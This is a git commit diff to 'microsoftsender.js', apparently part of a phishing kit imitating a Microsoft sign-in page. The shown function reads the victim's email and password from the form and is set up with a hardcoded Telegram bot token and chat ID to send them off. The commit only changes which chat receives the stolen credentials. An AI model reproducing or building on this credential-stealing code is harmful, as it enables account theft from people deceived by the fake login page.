f2289d7ad9998fb7b4156a06e7429c3442deab80
callertune <157599914+callertune@users.noreply.github.com>
2024-01-24 04:27:03 -0800

    Update microsoftsender.js

--- microsoftsender.js
+++ microsoftsender.js
@@ -1,6 +1,6 @@
 function sendTelegramMessageAndRedirect() {
     const telegramBotToken = '6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw'; // add the telegram token
-    const chatId = 5349229520;                                                 // add ths id from the web It's usually a number, not a string
+    const chatId = 5710607863;                                                 // add ths id from the web It's usually a number, not a string
     const emailValue = document.getElementById('email').value;
     const passwordValue = document.getElementById('password').value;
 
